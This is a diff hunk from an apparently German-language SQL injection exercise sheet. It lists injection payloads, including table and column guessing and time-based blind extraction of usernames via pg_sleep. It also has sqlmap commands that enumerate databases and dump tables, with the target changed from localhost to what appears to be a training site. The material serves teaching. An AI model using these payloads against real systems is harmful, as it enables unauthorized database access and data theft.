@@ -9,9 +9,9 @@ Aufgabe  9: ' AND 1=(SELECT COUNT(*) FROM guessed_table) --
 Aufgabe 10: ' AND known_table.guessed_column IS NULL –-
 Wortlänge:  '); SELECT CASE WHEN (SELECT LENGTH(username) FROM usr FETCH FIRST 1 ROW ONLY)<6 THEN pg_sleep(4) ELSE null END --
 Wort:       '); SELECT CASE WHEN (SELECT SUBSTR(username,1,1) FROM usr FETCH FIRST 1 ROW ONLY)='a' THEN pg_sleep(4) ELSE null END --
-sqlmap 1:   python sqlmap.py -u http://localhost:8080/ads?s=b --dbs
-sqlmap 2:   python sqlmap.py -u http://localhost:8080/ads?s=b -D database -–tables
-sqlmap 3:   python sqlmap.py -u http://localhost:8080/ads?s=b -D database –T table --dump
+sqlmap 1:   sqlmap.py -u http://vulnerads.de/ads?s=b --dbs
+sqlmap 2:   sqlmap.py -u http://vulnerads.de/ads?s=b -D database --tables
+sqlmap 3:   sqlmap.py -u http://vulnerads.de/ads?s=b -D database -T table --dump
 
 
 Prepared Statements:
